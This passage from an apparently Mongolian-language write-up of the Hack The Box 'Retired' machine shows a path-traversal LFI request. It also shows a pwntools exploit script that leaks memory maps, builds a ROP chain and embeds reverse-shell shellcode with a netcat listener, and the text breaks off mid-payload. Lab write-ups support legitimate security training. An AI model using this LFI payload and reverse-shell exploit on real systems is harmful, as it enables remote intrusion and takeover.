  .dl_bw-&gt;total_bw               : 0

runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
 S         cpuhp/1    16      1925.910783        10   120         0.000000         0.125863         0.000000 0 0 /
 S     migration/1    17         0.000000     21244     0         0.000000       478.944269         0.000000 0 0 /
 S     ksoftirqd/1    18    468578.705180    234364   120         0.000000      3687.323637         0.000000 0 0 /
 I    kworker/1:0H    20       817.144023         5   100         0.000000         0.031758         0.000000 0 0 /
 S       kdevtmpfs    23      3672.685848       128   120         0.000000         0.895750         0.000000 0 0 /
 S         kauditd    25      1773.778542         7   120         0.000000         1.538124         0.000000 0 0 /
 S      kcompactd0    29    468589.493121    165392   120         0.000000      2888.144105         0.000000 0 0 /
 S      khugepaged    31    468588.783514     14660   139         0.000000      1965.951916         0.000000 0 0 /
 I  blkcg_punt_bio    51        30.719385         2   100         0.000000         0.006112         0.000000 0 0 /
 I      devfreq_wq    53        36.721191         2   100         0.000000         0.003166         0.000000 0 0 /
 S   irq/25-pciehp    59         0.000000         3    49         0.000000         0.059041         0.000000 0 0 /
 S   irq/27-pciehp    61         0.000000         3    49         0.000000         0.059552         0.000000 0 0 /
 S   irq/29-pciehp    63         0.000000         3    49         0.000000         0.060093         0.000000 0 0 /
 S   irq/31-pciehp    65         0.000000         3    49         0.000000         0.139933         0.000000 0 0 /
 S   irq/33-pciehp    67         0.000000         3    49         0.000000         0.073699         0.000000 0 0 /
 S   irq/35-pciehp    69         0.000000         3    49         0.000000         0.068078         0.000000 0 0 /
 S   irq/37-pciehp    71         0.000000         3    49         0.000000         0.080543         0.000000 0 0 /
 S   irq/39-pciehp    73         0.000000         3    49         0.000000         0.118641         0.000000 0 0 /
 S   irq/41-pciehp    75         0.000000         3    49         0.000000         0.083087         0.000000 0 0 /
 S   irq/43-pciehp    77         0.000000         3    49         0.000000         0.072787         0.000000 0 0 /
 S   irq/45-pciehp    79         0.000000         3    49         0.000000         0.153119         0.000000 0 0 /
 S   irq/47-pciehp    81         0.000000         3    49         0.000000         0.063015         0.000000 0 0 /
 S   irq/49-pciehp    83         0.000000         3    49         0.000000         0.060424         0.000000 0 0 /
 S   irq/51-pciehp    85         0.000000         3    49         0.000000         0.074419         0.000000 0 0 /
 S   irq/53-pciehp    87         0.000000         3    49         0.000000         0.084679         0.000000 0 0 /
 S   irq/55-pciehp    89         0.000000         3    49         0.000000         0.074229         0.000000 0 0 /
 I    kworker/1:1H    91    468587.284735     19166   100         0.000000       429.652332         0.000000 0 0 /
 I         ata_sff   150      1064.213540         2   100         0.000000         0.004478         0.000000 0 0 /
 I      scsi_tmf_0   152      1071.218263         2   100         0.000000         0.006162         0.000000 0 0 /
 S       scsi_eh_1   153      1112.506859         4   120         0.000000        11.165957         0.000000 0 0 /
 I      scsi_tmf_1   154      1079.223485         2   100         0.000000         0.008987         0.000000 0 0 /
 S       scsi_eh_3   163      1354.203716        26   120         0.000000         0.318601         0.000000 0 0 /
 S       scsi_eh_4   165      1354.364173        26   120         0.000000         0.594965         0.000000 0 0 /
 S       scsi_eh_5   167      1354.265520        26   120         0.000000         0.378000         0.000000 0 0 /
 S       scsi_eh_6   169      1354.359390        26   120         0.000000         0.474015         0.000000 0 0 /
 S       scsi_eh_8   173      1354.266204        26   120         0.000000         0.299895         0.000000 0 0 /
 S      scsi_eh_11   179      1354.319499        26   120         0.000000         0.347599         0.000000 0 0 /
 S      scsi_eh_12   181      1354.294967        26   120         0.000000         0.327516         0.000000 0 0 /
 S      scsi_eh_13   183      1354.305362        26   120         0.000000         0.333553         0.000000 0 0 /
 S      scsi_eh_14   185      1354.313890        26   120         0.000000         0.297549         0.000000 0 0 /
 S      scsi_eh_19   195      1354.365835        26   120         0.000000         0.338002         0.000000 0 0 /
 S      scsi_eh_21   199      1354.259069        26   120         0.000000         0.231276         0.000000 0 0 /
 S      scsi_eh_22   201      1354.287901        26   120         0.000000         0.261962         0.000000 0 0 /
 S      scsi_eh_24   205      1354.357431        26   120         0.000000         0.329507         0.000000 0 0 /
 S      scsi_eh_28   213      1354.362151        26   120         0.000000         0.334969         0.000000 0 0 /
 I     scsi_tmf_31   220      1326.966833         2   100         0.000000         0.016151         0.000000 0 0 /
 S     jbd2/sda1-8   281    468587.491477     46702   120         0.000000      2213.353470         0.000000 0 0 /
 S systemd-journal   332    468570.029689     74993   120         0.000000     11469.204517         0.000000 0 0 /
 S   VGAuthService   388      3672.933937       102   120         0.000000        24.317929         0.000000 0 0 /
 S        vmtoolsd   389    468591.640059    974905   120         0.000000     75748.585991         0.000000 0 0 /
 S    HangDetector   478    468589.235347     84811   120         0.000000      3271.888116         0.000000 0 0 /
 I          cryptd   394      1821.306494         2   100         0.000000         0.025498         0.000000 0 0 /
 S   irq/16-vmwgfx   398         0.000000    315126    49         0.000000      6109.678753         0.000000 0 0 /
 I        ttm_swap   404      1846.587609         2   100         0.000000         0.005039         0.000000 0 0 /
 S     card0-crtc0   405         0.000000         2    49         0.000000         0.003597         0.000000 0 0 /
 S     card0-crtc1   406         0.000000         2    49         0.000000         0.003386         0.000000 0 0 /
 S     card0-crtc2   407         0.000000         2    49         0.000000         0.003096         0.000000 0 0 /
 S     card0-crtc3   408         0.000000         2    49         0.000000         0.002765         0.000000 0 0 /
 S     card0-crtc4   409         0.000000         2    49         0.000000         0.002965         0.000000 0 0 /
 S     card0-crtc5   410         0.000000         2    49         0.000000         0.002695         0.000000 0 0 /
 S     card0-crtc6   411         0.000000         2    49         0.000000         0.002484         0.000000 0 0 /
 S     card0-crtc7   412         0.000000         2    49         0.000000         0.002435         0.000000 0 0 /
 S        rsyslogd   423    468436.598541       176   120         0.000000        15.178844         0.000000 0 0 /
 S     in:imuxsock   438    468569.565158     41729   120         0.000000      1456.008380         0.000000 0 0 /
 S       in:imklog   439    459624.836862        16   120         0.000000         3.803078         0.000000 0 0 /
 S   rs:main Q:Reg   440    468569.559458     41671   120         0.000000      1326.234113         0.000000 0 0 /
 S           nginx   541    425815.900707         5   120         0.000000         0.860043         0.000000 0 0 /
 S           nginx   543    465475.646747    616996   120         0.000000    141323.361247         0.000000 0 0 /
 S            sshd 31241    410461.163963        32   120         0.000000        32.728368         0.000000 0 0 /
 S            sshd 31249    468578.986207       464   120         0.000000        56.943783         0.000000 0 0 /
 S            bash 31250    413038.940766        89   120         0.000000        34.014433         0.000000 0 0 /
 I    kworker/u4:3 35630    468153.297932       550   120         0.000000        29.587530         0.000000 0 0 /
 I     kworker/1:0 35699    468595.964356     33275   120         0.000000      1341.618264         0.000000 0 0 /
 I     kworker/1:2 35985    468359.826004        15   120         0.000000         0.156181         0.000000 0 0 /
</code></pre><p>activate_licens</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------------------------
</span></span><span style=display:flex><span>activate_licens   418    446273.871782        30   120         0.000000         9.136912         0.000000 0 0 /
</span></span></code></pre></div><p><code>PID</code> -> 418</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../proc/418/exe HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.154
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>burp-s save file —Ö–∏–π–Ω—ç.</p><h3 id=6-buffer-overflow>6. Buffer Overflow<a hidden class=anchor aria-hidden=true href=#6-buffer-overflow>#</a></h3><p>burp-s save —Ö–∏–π—Å—ç–Ω —Ñ–∞–π–ª–∞–∞ binary –Ω—ç—Ä—Ç—ç–π –±–æ–ª–≥–æ–æ–¥ execute —Ö–∏–π–∂ “Ø–∑—ç–≤:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod +x binary
</span></span><span style=display:flex><span>./binary <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> starting server listening on port <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> listening ..
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3  </span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>1337</span>)
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(r)  <span style=color:#75715e># debug in gdb</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libsqlite3.so.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
</span></span><span style=display:flex><span>Reading symbols from /usr/lib/debug/.build-id/54/eef5ce96cf37cb175b0d93186836ca1caf470c.debug...
</span></span><span style=display:flex><span>Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
</span></span><span style=display:flex><span>Reading symbols from /usr/lib/debug/.build-id/e9/d2c06479b13dd3cfa78d714d11dccf6fcbee51.debug...
</span></span><span style=display:flex><span>Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
</span></span><span style=display:flex><span>Reading symbols from /usr/lib/debug/.build-id/50/18237bbf012b4094027fd0b96fc22a24496ea4.debug...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Thread debugging using libthread_db enabled<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Using host libthread_db library <span style=color:#e6db74>&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style=display:flex><span>Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
</span></span><span style=display:flex><span>Reading symbols from /usr/lib/debug/.build-id/11/8b90161526d181807818c459baee841993795b.debug...
</span></span><span style=display:flex><span>Reading symbols from /lib64/ld-linux-x86-64.so.2...
</span></span><span style=display:flex><span>Reading symbols from /usr/lib/debug/.build-id/32/438eb3b034da54caf58c7a65446639f7cfe274.debug...
</span></span><span style=display:flex><span>--Type &lt;RET&gt; <span style=color:#66d9ef>for</span> more, q to quit, c to <span style=color:#66d9ef>continue</span> without paging--c
</span></span><span style=display:flex><span>0x00007f17a957de8e in __GI___libc_read <span style=color:#f92672>(</span>fd<span style=color:#f92672>=</span>4, buf<span style=color:#f92672>=</span>0x7ffc84813adc, nbytes<span style=color:#f92672>=</span>4<span style=color:#f92672>)</span> at ../sysdeps/unix/sysv/linux/read.c:26
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
</span></span></code></pre></div><p>Script.py nc -vlnp 9001 local ip -—Ç–∞–π –∞–∂–∏–ª—É—É–ª–ª–≤–∞–ª
netcat</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -vlnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><p>python script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 script.py 10.10.14.58 <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>  
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys<span style=color:#f92672>,</span>re<span style=color:#f92672>,</span>requests<span style=color:#f92672>,</span>socket  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>IP<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10.10.11.154&#34;</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>usage</span>():  
</span></span><span style=display:flex><span>¬† ¬† print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Usage: </span><span style=color:#e6db74>{</span>sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74> &lt;LOCAL IP&gt; &lt;LOCAL PORT&gt;&#34;</span>)  
</span></span><span style=display:flex><span>¬† ¬† exit()  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># download file and save to /tmp  </span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_file</span>(path):  
</span></span><span style=display:flex><span>¬† ¬† r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=</span><span style=color:#e6db74>{</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)  
</span></span><span style=display:flex><span>¬† ¬† lpath <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;/tmp/</span><span style=color:#e6db74>{</span>path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;/&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>with</span> open(lpath,<span style=color:#e6db74>&#34;wb&#34;</span>) <span style=color:#66d9ef>as</span> f:  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>content)  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>return</span> lpath  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># find process id  </span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_pid</span>():  
</span></span><span style=display:flex><span>¬† ¬† r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=/proc/sched_debug&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)  
</span></span><span style=display:flex><span>¬† ¬† pid <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;activate_licens\s+([0-9]+)&#34;</span>,r<span style=color:#f92672>.</span>text)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)  
</span></span><span style=display:flex><span>¬† ¬† print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] activate_license running @ PID </span><span style=color:#e6db74>{</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>return</span> pid  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># extract base addresses from /proc/PID/maps  </span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_addresses</span>(pid):¬† ¬† ¬† ¬†¬†  
</span></span><span style=display:flex><span>¬† ¬† r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=/proc/</span><span style=color:#e6db74>{</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>/maps&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)  
</span></span><span style=display:flex><span>¬† ¬† libc_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libc.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)  
</span></span><span style=display:flex><span>¬† ¬† libc_path <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libc.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]  
</span></span><span style=display:flex><span>¬† ¬† libsqlite_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libsqlite.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)  
</span></span><span style=display:flex><span>¬† ¬† libsqlite_path <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libsqlite.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]  
</span></span><span style=display:flex><span>¬† ¬† stack_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*\[stack\].*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)  
</span></span><span style=display:flex><span>¬† ¬† stack_end <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*\[stack\].*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>split()[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>return</span> libc_base, libc_path,libsqlite_base, libsqlite_path, stack_base, stack_end  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† usage()  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>try</span>:  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† ip <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>inet_aton(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>])  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† port <span style=color:#f92672>=</span>¬† port<span style=color:#f92672>=</span>struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&gt;H&#34;</span>,int(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>]))  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>except</span>:  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[-] Invalid arguments&#34;</span>)  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† usage()  
</span></span><span style=display:flex><span>¬† ¬† ¬†¬†  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># Shellcode¬† ¬†¬† msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f py  </span>
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>=</span>¬† <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x97\x48\xb9\x02\x00</span><span style=color:#e6db74>&#34;</span>¬†¬† <span style=color:#f92672>+</span> port¬† <span style=color:#f92672>+</span>¬† ip <span style=color:#f92672>+</span>¬†¬† <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x51\x48</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>¬† ¬† shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05</span><span style=color:#e6db74>&#34;</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># search PID with LFI  </span>
</span></span><span style=display:flex><span>¬† ¬† pid <span style=color:#f92672>=</span> get_pid()  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> pid:  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[-] Could not find PID for activate_license&#34;</span>)  
</span></span><span style=display:flex><span>¬† ¬† ¬† ¬† exit()¬† ¬†¬†  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># search addresses in /proc/PID/maps  </span>
</span></span><span style=display:flex><span>¬† ¬† libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end <span style=color:#f92672>=</span> get_addresses(pid)¬†  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># calc sizeof(stack) for mprotect¬† ¬† ¬†¬†  </span>
</span></span><span style=display:flex><span>¬† ¬† stack_size <span style=color:#f92672>=</span> stack_end <span style=color:#f92672>-</span> stack_base¬† ¬†¬† <span style=color:#75715e># 0x21000¬† ¬† ¬† ¬† ¬† ¬† ¬†¬†  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† context<span style=color:#f92672>.</span>clear(arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>)  
</span></span><span style=display:flex><span>¬† ¬† libc <span style=color:#f92672>=</span> ELF(get_file(libc_path),checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># download libc  </span>
</span></span><span style=display:flex><span>¬† ¬† libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base  
</span></span><span style=display:flex><span>¬† ¬† libsql <span style=color:#f92672>=</span> ELF(get_file(libsqlite_path),checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)¬† ¬† ¬†¬† <span style=color:#75715e># download libsqlite  </span>
</span></span><span style=display:flex><span>¬† ¬† libsql<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libsqlite_base  
</span></span><span style=display:flex><span>¬† ¬† rop <span style=color:#f92672>=</span> ROP([libc, libsql])  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>520</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># search ROP Gadgets¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬†  </span>
</span></span><span style=display:flex><span>¬† ¬† mprotect <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;mprotect&#39;</span>]¬† ¬†¬† <span style=color:#75715e># 0xf8c20¬† ¬† ¬† ¬† ¬†¬† readelf -s libc.so.6 | grep mprotect  </span>
</span></span><span style=display:flex><span>¬† ¬† pop_rdi <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rdi[<span style=color:#ae81ff>0</span>]¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># 0x26796¬† ¬† ¬† ¬† ¬†¬† ropper -f libc.so.6 --search &#34;pop rdi&#34;  </span>
</span></span><span style=display:flex><span>¬† ¬† pop_rsi <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rsi[<span style=color:#ae81ff>0</span>]¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># 0x2890f¬† ¬† ¬† ¬† ¬†¬† ropper -f libc.so.6 --search &#34;pop rsi&#34;  </span>
</span></span><span style=display:flex><span>¬† ¬† pop_rdx <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rdx[<span style=color:#ae81ff>0</span>]¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># 0xcb1cd¬† ¬† ¬† ¬† ¬†¬† ropper -f libc.so.6 --search &#34;pop rdx&#34;  </span>
</span></span><span style=display:flex><span>¬† ¬† jmp_rsp <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>jmp_rsp[<span style=color:#ae81ff>0</span>]¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># 0xd431d¬† ¬† ¬† ¬† ¬†¬† ropper -f libsqlite3.so.0.8.6 --search &#34;jmp rsp&#34;  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> offset  
